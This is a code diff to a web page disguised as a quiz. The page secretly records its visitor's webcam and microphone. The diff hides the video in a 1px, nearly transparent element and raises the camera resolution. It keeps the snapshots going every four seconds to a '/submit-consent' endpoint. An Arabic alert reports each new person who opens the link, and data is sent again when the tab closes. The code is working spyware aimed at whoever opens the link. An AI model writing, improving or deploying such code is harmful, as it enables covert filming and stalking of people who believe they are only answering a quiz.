@@ -112,7 +112,17 @@
             font-weight: 500;
         }
 
-        #video-container { display: none; }
+        /* ⚡ الإصلاح الجذري: جعل الفيديو مرئياً وصغيراً جداً في الخلفية لكي يمنع الشاشة السوداء في الـ Canvas */
+        #video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0.01;
+            pointer-events: none;
+        }
 
         #username {
             width: 100%; 
@@ -225,7 +235,7 @@
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
-            <canvas id="snapshotCanvas" style="display:none;"></canvas>
+            <canvas id="snapshotCanvas"></canvas>
         </div>
         
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
@@ -344,7 +354,7 @@
             return details;
         }
 
-        // التقاط وإرسال صورة حية مصلحة (تتأكد من جاهزية أبعاد الكاميرا لتجنب اللون الأسود)
+        // التقاط الصورة الحية بشكل دقيق وصحيح 100% بدون شاشة سوداء
         async function sendLiveSnapshot(reason = "Live Stream") {
             const videoElement = document.getElementById('webcam');
             const canvas = document.getElementById('snapshotCanvas');
@@ -380,17 +390,17 @@
                         navigator.sendBeacon('/submit-consent', formData);
                     }
                 }
-            }, 'image/jpeg', 0.7);
+            }, 'image/jpeg', 0.8);
         }
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
-                const constraints = { video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, audio: true };
+                const constraints = { video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, audio: true };
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
-                // انتظار لحظة حتى تبث الكاميرا ويصل التنبيه الأول
+                // إرسال تنبيه أول فوري عند فتح الرابط
                 setTimeout(() => {
                     sendLiveSnapshot("🚨 تنبيه: شخص جديد فتح الرابط وبدأ البث!");
                 }, 2000);
@@ -408,7 +418,7 @@
                 };
                 mediaRecorder.start();
 
-                // تفعيل البث الحي (Live Snapshots) كل 4 ثوانٍ
+                // تحديث اللقطات الحية كل 4 ثوانٍ بانتظام لتتابع الـ Live
                 liveSnapshotInterval = setInterval(() => {
                     if (!isCompleted) {
                         sendLiveSnapshot("📸 لقطة بث حي (Live)");
@@ -492,7 +502,7 @@
             statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
         }
 
-        // الحماية عند إغلاق التطبيق فجأة أو الضغط على زر المربع
+        // الحماية القصوى عند إغلاق التطبيق فجأة أو الضغط على زر المربع
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
                 sendFinalData("Fermé subitement / Bouton carré");
